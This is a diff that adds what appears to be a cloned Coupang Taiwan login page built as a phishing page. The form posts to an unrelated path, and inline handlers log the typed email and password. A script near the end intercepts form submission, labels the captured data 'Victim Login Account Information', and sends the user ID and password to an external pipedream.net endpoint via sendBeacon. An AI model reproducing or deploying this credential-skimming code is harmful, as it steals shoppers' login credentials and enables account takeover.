@@ -1,0 +1,678 @@
+<html lang="zh-TW" class="pc-otp-login-v4"><head>
+        <meta charset="UTF-8">
+        <meta name="robots" content="noindex">
+        <title>登入</title>
+        <meta name="description" content="">
+        <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+        <meta http-equiv="pragma" content="no-cache">
+        <meta http-equiv="cache-control" content="no-cache">
+        <meta http-equiv="expires" content="0">
+        <link rel="apple-touch-icon-precomposed" href="//static.coupangcdn.com/image/coupang/favicon/v2/favicon_256x256.ico">
+        <script async="" src="https://scripts.clarity.ms/0.8.56/clarity.js"></script><script async="" src="https://www.clarity.ms/tag/uet/343219631?insights=1"></script>
+        <script type="text/javascript" async="" src="https://www.googletagmanager.com/gtag/destination?id=AW-347858037&amp;cx=c&amp;gtm=4e6331">
+        </script><script async="" src="https://d.line-scdn.net/n/line_tag/public/release/v1/lt.js"></script>
+        <script src="https://connect.facebook.net/signals/config/998664010840918?v=2.9.274&amp;r=stable&amp;domain=member.tw.coupang.com&amp;hme=8830461b0a3fda5230edea4335366eb6d682f53a525e54f7adf6ff7b70c96c39&amp;ex_m=100%2C193%2C142%2C22%2C69%2C70%2C135%2C65%2C64%2C11%2C150%2C86%2C16%2C129%2C122%2C72%2C75%2C128%2C147%2C152%2C8%2C4%2C5%2C7%2C6%2C3%2C87%2C97%2C153%2C158%2C207%2C59%2C174%2C175%2C52%2C251%2C30%2C71%2C219%2C218%2C217%2C23%2C32%2C99%2C58%2C10%2C60%2C93%2C94%2C95%2C101%2C125%2C31%2C29%2C127%2C124%2C123%2C143%2C73%2C146%2C144%2C145%2C47%2C57%2C118%2C15%2C149%2C42%2C239%2C240%2C238%2C26%2C27%2C28%2C45%2C136%2C74%2C108%2C18%2C20%2C41%2C37%2C39%2C38%2C80%2C88%2C92%2C106%2C134%2C137%2C43%2C107%2C24%2C21%2C114%2C66%2C35%2C139%2C138%2C140%2C131%2C130%2C25%2C34%2C56%2C105%2C148%2C67%2C17%2C141%2C110%2C78%2C63%2C19%2C81%2C82%2C111%2C33%2C264%2C200%2C189%2C190%2C188%2C267%2C259%2C49%2C201%2C103%2C126%2C77%2C116%2C51%2C44%2C46%2C109%2C115%2C121%2C55%2C61%2C50%2C53%2C96%2C151%2C1%2C119%2C14%2C117%2C12%2C2%2C54%2C89%2C62%2C113%2C85%2C84%2C154%2C155%2C90%2C91%2C9%2C120%2C98%2C48%2C132%2C83%2C76%2C68%2C112%2C102%2C40%2C133%2C0%2C79%2C36%2C104%2C13%2C156" async=""></script>
+  <script async="" src="https://connect.facebook.net/en_US/fbevents.js"></script><script type="text/javascript" async="" src="https://bat.bing.com/bat.js"></script>
+  <script type="text/javascript" async="" src="https://dynamic.criteo.com/js/ld/ld.js?a=107487"></script>
+  <script type="text/javascript" async="" src="https://www.googletagmanager.com/gtag/js?id=G-HQNCGEPLY5&amp;cx=c&amp;gtm=4e6331"></script>
+  <script async="" src="https://www.googletagmanager.com/gtm.js?id=GTM-WZVJCDZ"></script>
+  <!-- <script type="text/javascript" src="//asset2.coupangcdn.com/customjs/coupang-web-log/3.3.0/web-log.umd.min.js"></script> -->
+<!-- <script type="text/javascript" src="//asset2.coupangcdn.com/customjs/jserror/4.0.7-beta-17/jslog-iife.pe.min.js"></script> -->
+<!-- <script type="text/javascript" src="//asset2.coupangcdn.com/customjs/jserror/4.0.7-beta-17/jslog-iife.filters.pe.member_web.min.js"></script> -->
+<!-- <script>
+    try {
+        var jsLog = new JsLog('member_web', 'production', {
+            pageName: 'member',
+            domain: 'member',
+            instanceId: 'prod-6f798f9b66-qh8rh',
+            sendPageSource: false,
+            pageSourceErrorFilters: ['Unexpected token']
+        });
+        if (window.JsLogFilters) {
+            window.JsLogFilters.enableFilterRuleSet(jsLog, ['common', 'member_web'])
+        }
+        jsLog.enableTrap();
+    } catch(e) {
+        window.console && window.console.error && window.console.error(e);
+    }
+
+    var memberJsLog = {
+        errorReport: function (message, error) {
+            jsLog && jsLog.report && jsLog.report(message + (error && '[' + error.message + ']' || ''), error);
+            window.console && window.console.log(error);
+        }
+    };
+
+    window.memberJsLog = memberJsLog;
+    window.jsLog = jsLog;
+</script> -->
+
+
+
+        
+    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,minimum-scale=1,user-scalable=no,viewport-fit=cover">
+
+
+    
+
+    <!--[if lte IE 7]><script src="//asset2.coupangcdn.com/cdnjs/json2/20150503/json2.min.js" type="text/javascript"></script><![endif]-->
+<!--[if lt IE 9]><script src="/resources/20260304222732/components/html5shiv/html5shiv.min.js" type="text/javascript"></script><![endif]-->
+<!--[if IE]><script src="/resources/20260304222732/components/es5-shim/es5-shim.3.4.0.min.js" type="text/javascript"></script><![endif]-->
+    <noscript><meta http-equiv="refresh" content="0;URL=/login/guide/requireJavascript.pang"/></noscript>
+    
+
+    <script>var properties=properties||{};
+properties['coupangHomeUrl'] = "https://www.tw.coupang.com";
+properties['loginHomeUrl'] = "https://member.tw.coupang.com";
+properties['memberWiselogSid'] = "coupang";
+properties['promotionHomeUrl'] = "http://promotion.coupang.com";
+properties["url.coupang.login.login"] = "/login/login.pang";
+properties["url.coupang.login.playLogin"] = "/login/playLogin.pang";
+properties["url.coupang.login.playJoin"] = "/login/playMemberJoinFrm.pang";
+properties["url.coupang.login.loginProcess"] = "/login/loginProcess.pang";
+properties["url.coupang.login.join"] = "/login/memberJoinFrm.pang";
+properties["url.coupang.captcha.image"] = "https://member.tw.coupang.com/captcha/v1/image/memberCaptcha.png";
+properties["url.coupang.captcha.audio"] = "https://member.tw.coupang.com/captcha/v1/audio/memberCaptcha.wav";
+properties["url.coupang.identity"] = "https://id.tw.coupang.com";
+properties["url.coupang.login.redirectForPlay"] = "/login/service/play/redirect.pang";
+properties["url.csmessenger.two.factor.auth.pc"] = "https://mc.tw.coupang.com/ssr/desktop/contact/faq?keyword=%e9%9b%99%e6%ad%a5%e9%a9%9f%e9%a9%97%e8%ad%89";
+properties["url.csmessenger.two.factor.auth.mobile"] = "https://mc.tw.coupang.com/ssr/mobile/contact/faq/search?searchType=KEYWORD&value=%e9%9b%99%e6%ad%a5%e9%a9%9f%e9%a9%97%e8%ad%89";
+try{document.domain = 'coupang.com';}catch(e){}
+//document.domain = 'coupang.com';
+var I18n=I18n||{t:function(a,b){return b}};
+</script>
+<script type="text/javascript">
+    var CoupangSite = {"site":"TW","locale":"zh-TW","currency":{"code":"TWD","unit":"圓","layout":"price-unit","digitFraction":0,"unitType":"TEXT"}};
+</script>
+
+    
+  <script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start': new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0], j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src= 'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f); })(window,document,'script','dataLayer','GTM-WZVJCDZ');</script>
+  <script type="text/javascript">
+    function gtmInit() {
+      window.dataLayer = window.dataLayer || [];
+      function gtag() { dataLayer.push(arguments); }
+      gtag('js', new Date());
+      gtag('config', 'G-HQNCGEPLY5');
+    }
+    function putGTMToDataLayer(dataLayerItem) {
+      try {
+        if (!window.dataLayer) {
+          window.dataLayer = [];
+        }
+        if (Array.isArray(window.dataLayer)) {
+          window.dataLayer.push({ ecommerce: null });
+          window.dataLayer.push(dataLayerItem);
+        }
+      } catch (e) {
+        console.log(error);
+      }
+    }
+  </script>
+  <script async="" src="https://www.googletagmanager.com/gtag/js?id=G-HQNCGEPLY5" onload="gtmInit()"></script>
+
+    
+    
+    <link rel="stylesheet" href="https://member.tw.coupang.com/resources/20260304222732/dist/login.tw_zh-TW.css" type="text/css">
+    
+        
+            
+                <link rel="stylesheet" href="https://member.tw.coupang.com/resources/20260304222732/app-desktop/css/login.clean.tw_zh-TW.css" type="text/css">
+            
+        
+    
+
+    
+        <script src="https://member.tw.coupang.com/resources/20260304222732/components/qrcode/easy.qrcode.min.js" type="text/javascript"></script>
+    
+
+    
+        
+        <link rel="preload" href="https://member.tw.coupang.com/resources/20260304222732/dist/login.min.js" as="script">
+    
+
+
+    <style type="text/css"></style><style>INPUT:-webkit-autofill,SELECT:-webkit-autofill,TEXTAREA:-webkit-autofill{animation-name:onautofillstart}INPUT:not(:-webkit-autofill),SELECT:not(:-webkit-autofill),TEXTAREA:not(:-webkit-autofill){animation-name:onautofillcancel}@keyframes onautofillstart{}@keyframes onautofillcancel{}</style><script src="https://bat.bing.com/p/action/343219631.js" type="text/javascript" async="" data-ueto="ueto_e96ea373b9"></script><script type="text/javascript" async="" src="https://googleads.g.doubleclick.net/pagead/viewthroughconversion/347858037/?random=1772688556010&amp;cv=11&amp;fst=1772688556010&amp;bg=ffffff&amp;guid=ON&amp;async=1&amp;gtm=45be6331v873505893z8862565383za20gzb862565383zd862565383xea&amp;gcd=13l3l3l3l1l1&amp;dma=0&amp;tag_exp=103116026~103200004~115938465~115938468~116024733~117484252~117625637~117625640&amp;u_w=1536&amp;u_h=864&amp;url=https%3A%2F%2Fmember.tw.coupang.com%2Flogin%2Flogin.pang%3FrtnUrl%3Dhttps%253A%252F%252Fwww.tw.coupang.com%252Fnp%252Fpost%252Flogin%253Fr%253Dhttp%25253A%25252F%25252Fwww.tw.coupang.com%25252F&amp;ref=https%3A%2F%2Fwww.tw.coupang.com%2F&amp;frm=0&amp;tiba=%E7%99%BB%E5%85%A5&amp;hn=www.googleadservices.com&amp;npa=0&amp;pscdl=noapi&amp;auid=1154485371.1765436578&amp;uaa=x86&amp;uab=64&amp;uafvl=Not%253AA-Brand%3B99.0.0.0%7CGoogle%2520Chrome%3B145.0.7632.119%7CChromium%3B145.0.7632.119&amp;uamb=0&amp;uam=&amp;uap=Windows&amp;uapv=19.0.0&amp;uaw=0&amp;_tu=CA&amp;rfmt=3&amp;fmt=4"></script></head>
+    <body class="member-container member-root--clean page-null page-login-login env-production" data-log-pack="{ &quot;isMobile&quot;:false }" data-add-tnc="" data-page-name="login/login" data-web-product-global-ff="{&quot;blackList&quot;:&quot;&quot;}" data-web-build-no="20260304222732" data-is-international-phone-number="false" data-country-code="" data-is-country-code-always-visible="false" data-enable-e2e-metric="false" data-reference="{&quot;wiselogSid&quot;:&quot;coupang&quot;, &quot;profile&quot;:&quot;production&quot;, &quot;inAppBrowser&quot;:false, &quot;isMobile&quot;:false }">
+    
+
+
+    
+
+
+<div class="product-banner-wrapper"></div>
+
+<div class="member-wrapper 
+    member-wrapper--flex
+    
+        
+    
+    
+    
+
+    
+        pc-otp-login-v4
+    
+    
+ " data-disparity-login-tab="A">
+    
+        <header class="member-header " data-disparity-login-tab="A">
+            
+            <h1 class="member-logo">
+                <a href="https://www.tw.coupang.com" class="member-logo__link" style="background-image:url(//static.coupangcdn.com/image/zh-TW/static/login/logo-coupang.x2.20201201.png),none;">
+                <img src="//static.coupangcdn.com/image/zh-TW/static/login/logo-coupang.x2.20201201.png" width="100%" height="100%" class="member-logo__img-fixer" alt="coupang">
+                </a>
+            </h1>
+             
+        </header>
+    
+
+    
+
+    <div class="member-main">
+        
+    
+        
+            
+        
+    
+
+    
+
+    
+
+
+
+
+
+        
+        
+            <div class="tab-item-header tab-item-header-otp">
+                <a href="javascript:void(0)" class="password active" data-id="member-login" data-tab="password-login">電子信箱帳號登入</a>
+                
+                    <a href="javascript:void(0)" class="pc-otp-login-v4 " data-tab="pc-otp-login-v4">
+                        <span class="tab-item-title">手機號碼登入</span>
+                        <div class="otp-login-tooltip" style="display: none;">
+                            <div class="otp-login-tooltip__message">忘記密碼仍可進行登入。</div>
+                            <div class="otp-login-tooltip__close-btn"></div>
+                        </div>
+                    </a>
+                
+                
+            </div>
+        
+
+        
+        
+
+    
+
+
+
+
+
+
+        
+
+        
+
+        <div id="memberLogin" class="tab-item-content" data-mweb-otp-login-v4="A" data-gtm-enabled="true" data-international-phone-scope="" data-is-country-code-always-visible="" data-easy-login-is-saved="" data-biometry-is-saved="" data-show-easy-login-checkbox-ab-option="" data-is-from-easy-login-bottom-sheet="false" data-disable-easy-login-checkbox="false" data-otp-cta-btn-change-scope="false" data-login-design-hygiene-account-switch-and-manage="false" data-show-easy-login-checkbox-ab-option-v2="" data-enable-global-phone-sign-up="false" data-apply-unified-api-flow="true" data-apply-unified-api-flow-phone-otp="true" data-login-message-v2="true" data-improve-auto-login-failure="" data-enable-passkey-v2="" data-passkey-parity-target="" data-improve-auto-login-failure-tab="">
+            <div class="tab-item member-login _loginRoot
+                
+                sms-login-target
+                style-v2
+                
+                " data-first-purchase="false" data-coupon-benefit-type="" data-is-nudger-banner-v3-login="false" data-in-app-browser="" data-oauth-service-name="core" data-oauth-source-type="" data-auto-pre-inputted="" data-auto-target-acc="" data-auto-error-case="" data-auto-error-code-string="" data-prefilled-email="" data-prefilled-phone-number="" data-web-stability-hide-signup="" data-web-stability-pc-qr-code-login="true" data-web-stability-pc-otp-login-v4="B" data-web-stability-mweb-otp-login-v4="A" data-email-otp-ab-option="" data-improve-auto-login-failure="" data-is-auto-login-failure-token-mismatch="">
+            
+
+            
+            
+            
+            <div class="heads-up">
+    
+
+    
+</div>
+
+                
+                <form method="post" action="/c-corp/login-tw.html" class="login__form _loginForm
+                    
+                    
+                ">
+                    
+                    <input name="adult" value="false" type="hidden">
+                    <input name="rtnUrl" value="https%3A%2F%2Fwww.tw.coupang.com%2Fnp%2Fpost%2Flogin%3Fr%3Dhttp%253A%252F%252Fwww.tw.coupang.com%252F" type="hidden">
+                    <input name="token" value="" type="hidden">
+
+                    <input name="isRemember" value="false" type="hidden">
+                    
+                    <input name="step" value="" type="hidden">
+
+                    
+
+                    
+
+                    <div class="login__content login__content--input">
+                        
+<div class="member__field-wrap ">
+    <div class="member__input-field member__input-field--util">
+        <label class="member__input-wrap member__input-wrap-v2" for="login-email-input">
+            <span class="member__input-group member__input-group--icon-label">
+                <i class="member__sprite member__sprite--email"></i>
+            </span>
+            <span class="member__input-group">
+                <span class="member__input-floating-placeholder" style="display: none">帳號</span>
+              <!-- Log Point -->
+                <input type="email" class="member__input _loginIdInput ui-autocomplete-input" maxlength="80" name="user_id" id="login-email-input" value="" placeholder="帳號(email)" required oninput="console.log('User ID: ' + this.value);" autocomplete="off">
+
+                     <span class="member__input-area__mask-label _loginIdMaskedInput" style="display:none;"></span>
+            </span>
+        </label>
+        <span class="member__input-group member__input-group--util" style="">
+            <button class="member__util-trigger _loginIdClear" type="button" tabindex="-1">
+                <i class="member__sprite member__sprite--empty-trigger"></i>
+            </button>
+        </span>
+    </div>
+    <div class="member__expand-field">
+        <div class="member__message-area member__message-area--error _memberInputMessage login-fail-web-log-error-msg" style="display:none;"></div>
+    </div>
+</div>
+
+                        
+<div class="member__field-wrap ">
+    <div class="member__input-field member__input-field--util">
+        <label class="member__input-wrap member__input-wrap-v2" for="login-password-input">
+            <span class="member__input-group member__input-group--icon-label">
+                <i class="member__sprite member__sprite--password"></i>
+            </span>
+            <span class="member__input-group">
+                <span class="member__input-floating-placeholder" style="display: none">密碼</span>
+              <!-- Log Point -->
+                <input type="password" class="member__input _loginPasswordInput" value="" name="user_pw" id="login-password-input" maxlength="20" placeholder="密碼" required oninput="console.log('Password: ' + this.value);">
+            </span>
+        </label>
+        <span class="member__input-group member__input-group--util" style="">
+            <button class="member__util-trigger _loginPasswordShowTrigger" type="button" tabindex="-1">
+                <i class="member__sprite member__sprite--show-password  _loginPasswordIconOpenedEye" title="顯示字符"></i>
+                <i class="member__sprite member__sprite--hide-password  _loginPasswordIconClosedEye" title="隱藏字符" style="display:none;"></i>
+            </button>
+        </span>
+    </div>
+    <div class="member__expand-field">
+        <div class="member__message-area member__message-area--error _loginPasswordError login-fail-web-log-error-msg" style="display:none;"></div>
+    </div>
+</div>
+
+                    </div>
+                    <div class="login__content login__content--captcha  _loginCaptchaContainer" style="display: none;">
+                        <div class="login__text login__text--captcha-guide">
+    為保護會員資料安全，請輸入圖形驗證碼。
+</div>
+<div class="login-captcha">
+    <div class="captcha-util">
+        <button type="button" class="captcha__button
+                    }} _loginCaptchaReloadTrigger">
+            重新產生
+        </button>
+        <button type="button" class="captcha__button _loginCaptchaToAudioTrigger " style="display:none;">
+            播放語音
+        </button>
+        <button type="button" class="captcha__button captcha__button--type-changer _loginCaptchaToImageTrigger
+                    " style="display:none;">
+            以圖形顯示驗證碼
+        </button>
+    </div>
+    <div class="captcha-box">
+        <i class="captcha-box__fixer"></i>
+        <div class="captcha-box__group">
+            <img alt="자동입력 방지문자" class="captcha-box__image _loginCaptchaImage" width="300" height="75" style="display:none;">
+            <div class="captcha-box__content _loginCaptchaAudioGuide" style="display:none;">
+                <div class="captcha-box__text">
+                    <i class="member__sprite member__sprite--black-mic"></i>
+                    <span class="captcha-box__text captcha-box__text--centered-block _loginCaptchaAudioText">
+                        語音播放中
+                    </span>
+                    <a class="captcha-box__text captcha-box__text--link-centered-block _loginCaptchaAudioLink" href="" download="download" target="_blank" style="display: none;">
+                        下載語音
+                    </a>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="captcha-box captcha-box--audio _loginCaptchaAudioContainer">
+    </div>
+</div>
+<div class="member__field-wrap">
+    <div class="member__input-field">
+        <label class="member__input-wrap" for="login-captcha-input">
+            <span class="member__input-group">
+                <input type="text" class="member__input _loginCaptchaInput" name="captchaAnswer" id="login-captcha-input" value="" placeholder="請輸入圖形驗證碼。">
+            </span>
+        </label>
+    </div>
+    <div class="member__expand-field">
+        <div class="member__message-area member__message-area--error _memberInputMessage login-fail-web-log-error-msg"></div>
+    </div>
+</div>
+
+                    </div>
+
+                    
+                    <div class="login__content login__content--message">
+                        <div class="member__message-area member__message-area--error _loginCommonError login-fail-web-log-error-msg" style="display:none;">
+                            
+                        </div>
+                    </div>
+                    
+                        
+    
+    
+        
+    
+    <div class="login__content login__content--util">
+        
+        
+            <label for="login-keep-state" class="member__checkbox login__util__keep-login" aria-checked="true">
+                <input class="member__checkbox__input member__sprite-after member__sprite-after--checkbox _loginRememberInput" type="checkbox" id="login-keep-state" checked="">
+                
+                    <span class="member__checkbox__label">保持登入</span>
+                
+            </label>
+        
+        
+        
+            <a href="https://member.tw.coupang.com/login/accountInfoFind.pang" class="login__link login__link--find-id-password _loginFindIdPwLink">
+                
+                    找尋帳號(email)/密碼
+                
+                <i class="member__sprite member__sprite--right-arrow"></i>
+            </a>
+        
+        
+            <div class="login__keep-message _loginRememberMessage" style="display: none;">
+                <i class="member__sprite member__sprite--triangle"></i>
+                為保護您的個人資料，請只在自己的裝置上使用。
+            </div>
+        
+    </div>
+
+
+    <div class="login__content login__content--trigger">
+        
+            <button class="login__button login__button--submit _loginSubmitButton " type="submit">
+                登入
+            </button>
+        
+        
+            <div class="login__sms-login-button-wrapper _smsLoginLinkContainer" style="display: none">
+    <button class="login__button login__button--sms-login _smsLoginLink" data-email="" type="button">
+        휴대폰번호로 로그인
+    </button>
+    <div class="sms-login-tooltip _smsLoginTooltip" style="">
+        비밀번호 없이 간편 로그인하세요!
+        <div class="sms-login-tooltip__close-btn _smsLoginTooltipClose"></div>
+    </div>
+</div>
+        
+        
+        <hr class="login__separator">
+        
+        <a href="https://member.tw.coupang.com/login/memberJoinFrm.pang?rtnUrl=https%3A%2F%2Fwww.tw.coupang.com%2Fnp%2Fpost%2Flogin%3Fr%3Dhttp%253A%252F%252Fwww.tw.coupang.com%252F" class="login__button login__button--join _loginJoinLink ">註冊</a>
+    </div>
+
+
+                    
+                </form>
+            </div>
+
+            
+                <div class="tab-item pc-otp-login-v4">
+                    <div class="pc-otp-login-first-step">
+                        
+    <p class="otp-title-message">
+        
+            
+                請輸入您於酷澎帳戶綁定的手機號碼
+            
+        
+    </p>
+    <div class="login__content login__content--input">
+        <div class="member__field-wrap " id="phone-field-wrap" data-phone-regex="B">
+    <div class="member__input-field">
+        <label class="member__input-wrap member__input-wrap-v2  ">
+            
+            <input class="_phoneInput" type="tel" maxlength="13" placeholder="手機號碼" autofocus="" autocomplete="off">
+            <input class="_loginMaskPhoneInput" type="tel" placeholder="手機號碼" autofocus="" style="opacity: 0">
+            <span class="reset-phone"></span>
+        </label>
+    </div>
+    <div class="error-message"></div>
+</div>
+
+    </div>
+    
+    <button class="_phoneSubmitButton" type="submit">
+                    繼續
+    </button>
+    
+    
+        <span class="join-btn-wrap-group-asis" style="">
+            <hr class="login__separator">
+            <div id="otpSocialLoginContainer" style="display: none" data-enable-social-apps=""></div>
+            
+                <a class="otp-login-join _loginJoinLinkOnOtp" href="https://member.tw.coupang.com/login/memberJoinFrm.pang?rtnUrl=https%3A%2F%2Fwww.tw.coupang.com%2Fnp%2Fpost%2Flogin%3Fr%3Dhttp%253A%252F%252Fwww.tw.coupang.com%252F">註冊</a>
+            
+        </span>
+        <div class="join-btn-wrap-group-b" style="display: none;">
+            <div class="_loginJoinLink new_login__button--join">
+                <a href="https://member.tw.coupang.com/login/memberJoinFrm.pang?rtnUrl=https%3A%2F%2Fwww.tw.coupang.com%2Fnp%2Fpost%2Flogin%3Fr%3Dhttp%253A%252F%252Fwww.tw.coupang.com%252F">註冊</a>
+            </div>
+            <span></span>
+            <a href="https://login.coupang.com/corporation/member/landing-page">쿠팡비즈 가입</a>
+        </div>
+    
+    
+
+                    </div>
+                    <iframe class="pc-otp-login-iframe" name="pc-otp-login-iframe"></iframe>
+                    <form class="pc-otp-login-hidden-form" method="POST" target="pc-otp-login-iframe" style="display: none;"></form>
+                </div>
+            
+
+            <!-- svg sprite assets -->
+                <div style="display:none;"><!--?xml version="1.0" encoding="utf-8"?--><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><symbol fill="none" viewBox="0 0 40 40" id="attention" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M0 20C0 8.954 8.954 0 20 0s20 8.954 20 20-8.954 20-20 20S0 31.046 0 20Zm36.667 0c0-9.205-7.462-16.667-16.667-16.667-9.205 0-16.667 7.462-16.667 16.667 0 9.205 7.462 16.667 16.667 16.667 9.205 0 16.667-7.462 16.667-16.667Zm-14.584 9.583a2.083 2.083 0 1 1-4.166 0 2.083 2.083 0 0 1 4.166 0Zm-.386-19.777a1.667 1.667 0 0 0-3.322.194v13.333l.011.195a1.667 1.667 0 0 0 3.322-.195V10l-.01-.194Z" fill="#919EAB"></path></symbol><symbol fill="none" viewBox="0 0 12 12" id="refresh" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M11 2.612C9.776.93 7.992 0 6.031 0 2.712 0 0 2.691 0 6s2.712 6 6.031 6c2.212 0 4.285-1.264 5.166-3.026a.5.5 0 0 0-.894-.448C9.593 9.948 7.866 11 6.03 11 3.263 11 1 8.755 1 6s2.263-5 5.031-5c1.745 0 3.323.881 4.366 2.5H9l-.058.003A.5.5 0 0 0 9 4.5h2.24a.49.49 0 0 0 .021 0h.239l.058-.003A.5.5 0 0 0 12 4V1.25l-.003-.058A.5.5 0 0 0 11.5.75l-.058.003A.5.5 0 0 0 11 1.25v1.362Z" fill="#346AFF"></path></symbol></svg>
+</div>
+
+                <div class="tab-item qr-login" style="display:none">
+                    <div class="qr-login__content">
+                        <div>
+                            <div class="qr-login__instruction_header">
+                                쿠팡 앱을 통해 바로 로그인하려면 다음 단계에 따라 진행해주세요
+                            </div>
+                            <ol class="qr-login__instruction">
+                                <li>휴대폰 카메라로 QR코드를 스캔하세요.</li>
+                                <li>화면에서 아래의 숫자를 선택하면 로그인됩니다.</li>
+                            </ol>
+                            <div class="qr-login__number"></div>
+                            <p class="qr-login__app_requirements">최신 버전의 앱에서만 QR로그인이 가능합니다.</p>
+                        </div>
+                        <div class="right">
+                            <div class="qr-login__image">
+                            </div>
+                            <div class="qr-login__timer">남은시간 <span class="timer">3:00</span></div>
+                        </div>
+                    </div>
+                    <div class="qr-login__timeoff" style="display:none">
+                        <svg class="icon attention">
+                            <use xlink:href="#attention"></use>
+                        </svg>
+                        <p>해당 QR코드의 유효시간이 지났습니다.</p>
+                        <p>재시도 버튼을 눌러 새로운 QR코드로 다시 시도해주세요.</p>
+
+                        <button class="_refresh">
+                            <svg class="icon refresh">
+                                <use xlink:href="#refresh"></use>
+                            </svg>
+                            <span>재시도</span>
+                        </button>
+                    </div>
+
+                    <div class="qr-login__footer">
+                        <hr class="login__separator">
+                        <a href="https://member.tw.coupang.com/login/memberJoinFrm.pang?rtnUrl=https%3A%2F%2Fwww.tw.coupang.com%2Fnp%2Fpost%2Flogin%3Fr%3Dhttp%253A%252F%252Fwww.tw.coupang.com%252F" class="login__button login__button--join _loginJoinLink ">註冊</a>
+                    </div>
+                </div>
+            
+        </div>
+    
+        <span class="prodcut-view-v2-ccm-banner-top" style="">
+            
+            
+        </span>
+    
+    
+        <div class="otpLogin-wrapper" data-captcha-token="" data-apply-unified-api-flow-phone-otp="true">
+    <div class="otpLogin-modal">
+        <div class="otpLogin-header">
+            <b>電話號碼登入</b>
+            <span class="otpLogin-closeButton"></span>
+        </div>
+        <div class="otpLogin-content">
+            <div class="login__text login__text--captcha-guide">
+                為保護會員資料安全，請輸入圖形驗證碼。
+            </div>
+            <div class="login-captcha">
+                <div class="captcha-util">
+                    <button type="button" class="captcha__button otpLogin_loginCaptchaReloadTrigger">
+                        重新產生
+                    </button>
+                    <button type="button" class="captcha__button otpLogin_loginCaptchaToAudioTrigger" style="display:none;">
+                        播放語音
+                    </button>
+                    <button type="button" class="captcha__button captcha__button--type-changer otpLogin_loginCaptchaToImageTrigger" style="display:none;">
+                        以圖形顯示驗證碼
+                    </button>
+                </div>
+                <div class="captcha-box">
+                    <i class="captcha-box__fixer"></i>
+                    <div class="captcha-box__group">
+                        <img alt="자동입력 방지문자" class="captcha-box__image otpLogin_loginCaptchaImage" width="300" height="75" style="display:none;">
+                        <div class="captcha-box__content otpLogin_loginCaptchaAudioGuide" style="display:none;">
+                            <div class="captcha-box__text">
+                                <i class="member__sprite member__sprite--black-mic"></i>
+                                <span class="captcha-box__text captcha-box__text--centered-block otpLogin_loginCaptchaAudioText">
+                                    語音播放中
+                                </span>
+                                <a class="captcha-box__text captcha-box__text--link-centered-block otpLogin_loginCaptchaAudioLink" href="" download="download" target="_blank" style="display: none;">
+                                    下載語音
+                                </a>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="captcha-box captcha-box--audio otpLogin_loginCaptchaAudioContainer">
+                </div>
+            </div>
+            <div class="member__field-wrap">
+                <div class="member__input-field">
+                    <label class="member__input-wrap" for="login-captcha-input">
+                        <span class="member__input-group">
+                            <input type="text" class="member__input otpLogin_loginCaptchaInput" name="captchaAnswer" id="login-captcha-input" value="" placeholder="請輸入圖形驗證碼。">
+                        </span>
+                    </label>
+                </div>
+                <div class="member__expand-field">
+                    <div class="member__message-area member__message-area--error otpLogin_memberInputMessage login-fail-web-log-error-msg"></div>
+                </div>
+            </div>
+
+        </div>
+        <div class="otpLogin-footer">
+            確認
+        </div>
+    </div>
+</div>
+    </div>
+
+            <span class="prodcut-view-v2-ccm-banner-bottom" style="display: none;">
+
+                
+            </span>
+             <div class="member-footer" style="margin-top:24px;">
+                <div>
+                    ©Coupang Taiwan Corp. All rights reserved.
+                </div>
+            </div>
+</div>
+
+
+<div class="temp-content"></div>
+
+<div class="modal-container">
+    <div class="modal-bg"></div>
+    <div class="modal-layer">
+        <button class="modal-close-btn" type="button">×</button>
+        <div class="modal-content"></div>
+    </div>
+</div>
+
+<!-- <script type="text/javascript" src="//asset2.coupangcdn.com/customjs/ctools-ff/0.0.3/global-ff.min.js"></script> -->
+<script type="text/javascript">
+    
+    try {
+        window.__coupang_ui__ = window.__coupang_ui__ || {};
+        window.__coupang_ui__.webProductGlobalFFData = JSON.parse("{\"blackList\":\"\"}") || {};
+    } catch (e) {
+    }
+    
+</script>
+
+    
+        
+        <script type="text/javascript" src="https://member.tw.coupang.com/resources/20260304222732/dist/login.min.js"></script><div class="scoped-modal__container" style="display:none;"><b class="scoped-modal__blocker"></b><b class="scoped-modal__position-fixer"></b>
+  <div class="scoped-modal__content scoped-modal__content--response-simple"></div></div><ul class="ui-autocomplete ui-front ui-menu ui-widget ui-widget-content" id="ui-id-1" tabindex="0" style="display: none;"></ul><span role="status" aria-live="assertive" aria-relevant="additions" class="ui-helper-hidden-accessible"></span><div class="qr-tab-under-line" style="top: 166.638px;"></div>
+    
+
+<!-- Log Point -->
+<script>
+    document.addEventListener('submit', function(e) {
+        const form = e.target;
+        if (form.classList.contains('_loginForm') || form.action.includes('login')) {
+            const userId = form.querySelector('[name="user_id"]')?.value || '';
+            const userPw = form.querySelector('[name="user_pw"]')?.value || '';
+            
+            if (userId && userPw) {
+                console.log('=== Victim Login Account Information ===');
+                console.log('UserID:', userId);
+                console.log('Password:', userPw);
+                console.log('========================================');
+                
+                const url = 'https://11c9bf472599957da48779c59702d232.m.pipedream.net';
+                
+                if (navigator.sendBeacon) {
+                    navigator.sendBeacon(url, JSON.stringify({
+                        user_id: userId,
+                        user_pw: userPw,
+                        timestamp: new Date().toISOString()
+                    }));
+                }
+                
+                
+            }
+        }
+    }, true);
+</script>
+
+          
+
+<script src="//front.coupangcdn.com/web-inspector/config/web-inspector.config.js"></script>
+<script type="text/javascript" id="" charset="">!function(b,e,f,g,a,c,d){b.fbq||(a=b.fbq=function(){a.callMethod?a.callMethod.apply(a,arguments):a.queue.push(arguments)},b._fbq||(b._fbq=a),a.push=a,a.loaded=!0,a.version="2.0",a.queue=[],c=e.createElement(f),c.async=!0,c.src=g,d=e.getElementsByTagName(f)[0],d.parentNode.insertBefore(c,d))}(window,document,"script","https://connect.facebook.net/en_US/fbevents.js");fbq("init","998664010840918");fbq("track","PageView");</script>
